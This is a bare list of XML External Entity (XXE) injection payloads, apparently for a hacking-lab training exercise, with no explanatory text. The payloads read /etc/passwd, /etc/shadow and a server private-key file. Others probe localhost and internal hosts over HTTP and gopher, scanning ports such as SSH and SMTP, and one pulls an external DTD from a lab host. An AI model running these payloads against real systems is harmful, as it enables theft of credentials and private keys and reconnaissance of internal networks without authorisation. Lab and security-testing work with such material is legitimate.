# XXE Demos

~~~
<!DOCTYPE foo [ <!ENTITY xxe "1234" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "1234" >]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/passwd" >]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/shadow" >]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "." >]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/opt/applic/apache-2.2.8/conf/server-200.pem" >]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1/index.html" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1/foobar" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:1234" > ]>
 
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:22" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://152.96.6.236:25/foobar" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://152.96.6.246:22/foobar" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "gopher://152.96.6.246:22/foobar" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://152.96.6.231/index.html" > ]>
 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "gopher://127.0.0.1:22/a">]>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/a">]>
 
<!DOCTYPE query PUBLIC "-//IETF/hack" "http://glocken.hacking-lab.com:80/nofile">
~~~
